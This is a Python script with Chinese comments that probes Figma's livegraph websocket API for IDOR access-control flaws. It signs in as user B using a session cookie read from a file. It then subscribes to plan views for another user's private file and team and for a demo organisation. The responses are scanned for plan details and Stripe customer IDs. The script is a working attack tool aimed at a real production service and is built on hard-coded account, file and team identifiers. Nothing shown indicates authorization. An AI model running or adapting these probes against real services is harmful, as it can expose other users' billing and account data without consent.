"""登录态 Plan 族 + org/team 维度 IDOR:
B(非成员) 登录 → A 的资源(私有文件/A team)+ Demo Org 对照
关键:PlanByFileKey 之前匿名测只试了公开文件;现在 B 登录 + A 私有文件
PlanByTeamId/PlanByOrgId 之前匿名被拒;现在 B 登录 + 非 B 的 team/org"""
import sys, json, asyncio, io
import websockets
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

A_PRIV = "qzDqStIDJyGbthpKiuvfwg"
PUB = "bv2nMIdFf4u3dESGail4sm"
A_TEAM = "1666382706663462213"
DEMO_TEAM = "1484993099407069875"
DEMO_ORG = "1484997479016537761"
B_UID = "1667396392129259941"
B_ANON = "e101e166-c8ed-43ac-bb3e-89903f418397"
COMMIT = "aeddb9472f99bd8829192d4263f27d7a6d5cef8e"
CK_B = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"

def lg_url(client_url):
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=dad80c10603319f8&pt=1786432687"
            f"&ph=dnoflh97wkg6_cF_nypMbd9rtfZmF2KhdefK4gshdaM"
            f"&userId={B_UID}&anonUserId={B_ANON}"
            f"&clientType=web&commitHash={COMMIT}"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{client_url}"
            f"&connectionType=initial&reconnect=0")

def auth(client_url):
    return {"messageType": "auth", "clientType": "web",
            "args": {"userId": B_UID, "anonymousUserId": B_ANON},
            "tags": {"clientType": "web", "commitHash": COMMIT,
                     "clientUrl": f"https://www.figma.com/file/{client_url}"},
            "clientRequestedVersion": 2}

async def sub(label, view_name, args, client_url, wait=12):
    frames = []
    try:
        async with websockets.connect(lg_url(client_url),
                                      additional_headers={"User-Agent": UA, "Cookie": CK_B,
                                                          "Origin": "https://www.figma.com"},
                                      max_size=50_000_000, open_timeout=15) as ws:
            await ws.send(json.dumps(auth(client_url)))
            for _ in range(3):
                msg = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(msg, str) and "authSuccess" in msg:
                    break
            await ws.send(json.dumps({"messageType": "subscribe", "viewName": view_name,
                                      "viewHash": "ab" * 16, "loadType": "initial", "args": args}))
            deadline = asyncio.get_event_loop().time() + wait
            while asyncio.get_event_loop().time() < deadline:
                try:
                    msg = await asyncio.wait_for(ws.recv(), timeout=3)
                    if isinstance(msg, str):
                        frames.append(msg)
                except asyncio.TimeoutError:
                    break
    except Exception as e:
        print(f"[{label}] ❌ {type(e).__name__}: {str(e)[:90]}")
        return
    hits = [f for f in frames if '"initial":' in f or 'viewSubscriptionFailed' in f]
    print(f"\n[{label}] 帧数={len(frames)} 有效={len(hits)}")
    for f in hits:
        # 摘要:Plan 相关字段 / 总长 / 是否拒绝
        if 'viewSubscriptionFailed' in f:
            print(f"  🚫 viewSubscriptionFailed: {f[:400]}")
        else:
            total = len(f)
            plan = 'PlanSubscription' in f or '"plan"' in f.lower()
            stripe = 'stripeCustomerId' in f
            print(f"  🖼 {total}B plan={plan} stripe={stripe} 前120: {f[120:420]}")
    if not hits:
        for f in frames[:1]:
            print(f"  · {f[:300]}")

async def main():
    print("======== B 登录态 IDOR(非成员视角) ========")
    # 1. B → A 私有文件 PlanByFileKey ⭐
    await sub("B→A私有 PlanByFileKey ⭐", "PlanByFileKey", {"fileKey": A_PRIV}, A_PRIV)
    # 2. B → A team PlanByTeamId ⭐
    await sub("B→A_team PlanByTeamId ⭐", "PlanByTeamId", {"teamId": A_TEAM}, PUB)
    # 3. B → DemoOrg PlanByOrgId(对照匿名拒绝)
    await sub("B→DemoOrg PlanByOrgId", "PlanByOrgId", {"orgId": DEMO_ORG}, PUB)
    # 4. B → Demoteam PlanByTeamId(对照)
    await sub("B→DemoTeam PlanByTeamId", "PlanByTeamId", {"teamId": DEMO_TEAM}, PUB)
    # 5. B → 公开文件 PlanByFileKey(对照:匿名可拿,登录应同样)
    await sub("B→公开 PlanByFileKey(对照)", "PlanByFileKey", {"fileKey": PUB}, PUB)

asyncio.run(main())
